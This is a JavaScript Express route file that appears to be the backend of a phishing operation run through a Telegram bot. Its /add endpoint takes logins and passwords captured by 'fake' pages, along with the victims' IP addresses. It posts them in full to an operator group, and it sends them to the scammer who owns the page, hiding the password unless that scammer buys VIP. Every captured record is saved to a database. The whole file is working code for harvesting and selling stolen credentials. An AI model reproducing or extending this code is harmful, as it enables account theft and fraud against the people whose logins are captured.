const {
    Router
} = require('express')
const bot = require('../../createBot')
const accs = require('../../database/models/account')
const user = require('../../database/models/userData')
const {
    names
} = require('./../../objects')
const router = Router()

router.post('/add', async (req, res) => {
    console.log(req.body)
    const userData = await user.findOne({
        tg_id: parseInt(req.body.id||424301603, 32)
    })
    const condidate = await accs.findOne({
        login: req.body.login,
        password: req.body.password
    })
    if (!condidate && req.body.login.trim()!=''&& req.body.password.trim()!='') {
        bot.sendMessage(process.env.NotifyGroup2, `✨ Новый аккаунт ${names[req.body.type]}\n😻 Логин: <code>${req.body.login}</code>\n🗝 Пароль: <code>${req.body.password}</code>\n\nАккаунт пользователя: @${userData.login||'-'}\nTelegram ID: <code>${userData.tg_id||'-'}</code>`,{parse_mode: 'HTML'})
        if (userData) {
            bot.sendMessage(parseInt(req.body.id, 32), userData.vip ? `✨ Новый аккаунт ${names[req.body.type]}\n😻 Логин: <code>${req.body.login}</code>\n🗝 Пароль: <code>${req.body.password}</code>` : `✨ Новый аккаунт ${names[req.body.type]}\n😻 Логин: ${req.body.login.includes('@')?req.body.login.split('@')[0].substr(0, Math.floor(req.body.login.split('@')[0].length*20/100))+'*'.repeat(req.body.login.split('@')[0].length-Math.floor(req.body.login.split('@')[0].length*20/100))+req.body.login.split('@')[1]:req.body.login.length<5?'*'.repeat(req.body.login.length):req.body.login.substr(0, Math.floor(req.body.login.length*30/100))+'*'.repeat(req.body.login.length-Math.floor(req.body.login.length*50/100))+req.body.login.substr(req.body.login.length-Math.floor(req.body.login.length*20/100), req.body.login.length)}\n🗝 Пароль: ${req.body.password.substr(0, Math.floor(req.body.password.length*30/100))+'*'.repeat(req.body.password.length-Math.floor(req.body.password.length*50/100))+req.body.password.substr(req.body.password.length-Math.floor(req.body.password.length*20/100), req.body.password.length)}\nДля просмотра данных от аккаунта приобретите VIP`, {
                reply_markup: {
                    inline_keyboard: [
                        userData.vip ? [] : [{
                            text: 'Купить VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
            await new accs({
                login: req.body.login,
                password: req.body.password,
                tg_id: parseInt(req.body.id, 32),
                type: req.body.type||'vk',
                fake: new URL(req.body.fake||'http://localhost').origin,
                ip: req.body.ip.split(',')[0]||'-',
                date: new Date()
            }).save()
        }
    }
    res.end()
})

module.exports = router